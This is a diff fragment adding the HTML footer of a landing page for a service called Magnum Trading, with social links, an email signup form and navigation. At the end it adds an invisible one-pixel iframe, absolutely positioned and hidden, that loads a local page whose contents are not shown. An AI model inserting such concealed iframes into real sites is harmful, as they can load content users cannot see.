+                                <i class="bi bi-megaphone-fill"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://twitter.com/MagnumCommunity">
+                                <i class="bi bi-twitter"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://linktr.ee/magnum.trade">
+                                <i class="bi bi-link"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://blog.magnum.trade/">
+                                <i class="bi bi-wordpress"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="">
+                                <i class="bi bi-globe"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://play.google.com/store/apps/details?id=io.sculptech.magnum">
+                                <i class="bi bi-google-play"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://t.me/magnum_trade_bot">
+                                <i class="bi bi-telegram"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+                <div class="row">
+                    <form id="subscriptionForm">
+                        <div class="input-group">
+                            <label for="">Receive latest updates and articles</label>
+                            <input type="text" name="" id="" placeholder="Your email" value="">
+                            <button type="submit" class="btn btn-primary">
+                                <img src="chevron-right.svg" alt="">
+                            </button>
+                        </div>
+                    </form>
+                    <ul>
+                        <li><a href="#Features">Features </a></li>
+                        <li><a href="#Pricing">Pricing</a></li>
+                        <li><a href="#Roadmap">Roadmap</a></li>
+                        <!-- <li><a href="#contactForm">Contact Us</a></li> -->
+                        <li><a href="https://docs.magnum.trade/" target="_blank">Docs</a></li>
+                    </ul>
+                </div>
+            </div>
+        </footer>
+        <div class="footer-bottom"> © <span id="year">2023</span> by Magnum Trading. All rights reserved.</div>
+
+
+    </div>
+    <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: medium; visibility: hidden;"
+        src="index_1.html"></iframe>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
